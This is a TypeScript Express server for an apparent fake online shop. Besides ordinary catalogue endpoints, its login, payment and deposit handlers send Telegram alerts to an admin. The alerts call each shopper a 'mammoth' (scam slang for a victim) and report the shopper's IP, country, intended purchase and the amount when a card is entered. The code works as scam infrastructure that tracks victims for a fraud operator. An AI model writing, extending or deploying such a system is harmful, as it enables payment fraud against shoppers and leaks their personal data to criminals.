import express, { Router } from "express";
import cors from "cors";
import axios from "axios";
import { Db, MongoClient } from "mongodb";
import helmet from "helmet";
import getIpData from "./utils/getIpData";
import bodyParser from "body-parser";
import { config } from "./config";

const mongoDbUrl = config.db.uri || "";
const mongoDbName = "site";
const mongoClient = new MongoClient(mongoDbUrl);
let mongoDb: Db;

async function connectDb() {
  await mongoClient.connect();
  console.log("MongoDB succesfully connected");
  mongoDb = mongoClient.db(mongoDbName);
}
connectDb();

const tgApi = axios.create({ baseURL: config.telegram.token });

const app = express();

const router = Router();

router.get("/getProductCategories", async (req, res) => {
  try {
    const categories = await mongoDb
      .collection("categories")
      .find({})
      .toArray();
    res.json(categories);
  } catch (e) {
    console.log(e);
    res.status(500).json({ msg: "Internal Server Error" });
  }
});

router.get("/getWholesaleDiscounts", async (req, res) => {
  try {
    const discounts = await mongoDb.collection("discounts").find({}).toArray();
    res.json(discounts);
  } catch (e) {
    console.log(e);
    res.status(500).json({ msg: "Internal Server Error" });
  }
});

router.get("/getProducts", async (req, res) => {
  try {
    const products = await mongoDb.collection("products").find({}).toArray();
    let productsDict: any = {};

    for (let product of products) {
      productsDict[product.id] = product;
    }

    res.json(productsDict);
  } catch (e) {
    console.log(e);
    res.status(500).json({ msg: "Internal Server Error" });
  }
});

router.get("/getProductSets", async (req, res) => {
  try {
    const productSets = await mongoDb
      .collection("productSets")
      .find({})
      .toArray();
    let productSetsDict: any = {};

    for (let product of productSets) {
      productSetsDict[product.id] = product;
    }

    res.json(productSetsDict);
  } catch (e) {
    console.log(e);
    res.status(500).json({ msg: "Internal Server Error" });
  }
});

router.get("/getReviews", async (req, res) => {
  try {
    const reviews = await mongoDb.collection("reviews").find({}).toArray();

    res.json(reviews);
  } catch (e) {
    console.log(e);
    res.status(500).json({ msg: "Internal Server Error" });
  }
});

router.post("/login", async (req, res) => {
  try {
    const { ip, country, countryEmoji } = getIpData(req);

    await tgApi.post("/sendMessage", {
      chat_id: config.telegram.adminId,
      text: `🦣 Зарегистрирован новый мамонт:\n🌎 IP: <code>${ip}</code> (${countryEmoji} - ${country})`,
      parse_mode: "HTML",
    });

    res.json();
  } catch (e) {
    console.log(e);
    res.status(500).json({ msg: "Internal Server Error" });
  }
});

router.post("/new_payment", async (req, res) => {
  try {
    const { ip, country, countryEmoji } = getIpData(req);

    console.log(req.body);
    const productIds = req.body.productIds.split(":");

    try {
      const products = await mongoDb.collection("products").find({}).toArray();
      let productsDict: any = {};

      for (let product of products) {
        productsDict[product.id] = product;
      }

      const productsNames = [];

      for (let i = 0; i < productIds.length; i++) {
        productsNames.push(productsDict[productIds[i]].name);
      }

      await tgApi.post("/sendMessage", {
        chat_id: config.telegram.adminId,
        text: `🦣 Мамонт 🌎 IP: <code>${ip}</code> (${countryEmoji} - ${country}), возможно купит: ${productsNames.join(
          ", "
        )} (<code>${req.body.price}</code>₽)`,
        parse_mode: "HTML",
      });
    } catch (e) {
      console.log(e);
      res.status(500).json({ msg: "Internal Server Error" });
    }

    res.json();
  } catch (e) {
    console.log(e);
    res.status(500).json({ msg: "Internal Server Error" });
  }
});

router.post("/new_deposit", async (req, res) => {
  try {
    const { ip, country, countryEmoji } = getIpData(req);

    await tgApi.post("/sendMessage", {
      chat_id: config.telegram.adminId,
      text: `💸 Мамонт 🌎 IP: <code>${ip}</code> (${countryEmoji} - ${country}) вбил карту: 💰 Сумма платежа: <code>${req.body.amount}</code>₽`,
      parse_mode: "HTML",
    });
  } catch (e) {
    console.log(e);
    res.status(500).json({ msg: "Internal Server Error" });
  }
});

const DOMAINS = ["http://localhost:5173", "https://detki.fun", "https://1203753-ct83161.tw1.su"];

app.use(express.json());
app.use(
  bodyParser.urlencoded({
    extended: true,
  })
);
app.use(bodyParser.json());
app.use(cors({ origin: DOMAINS, credentials: true }));
app.use(helmet());
app.use("/api", router);
app.use("/static", express.static("public"));

app.listen(process.env.PORT || 8080, () => console.log("App is running"));
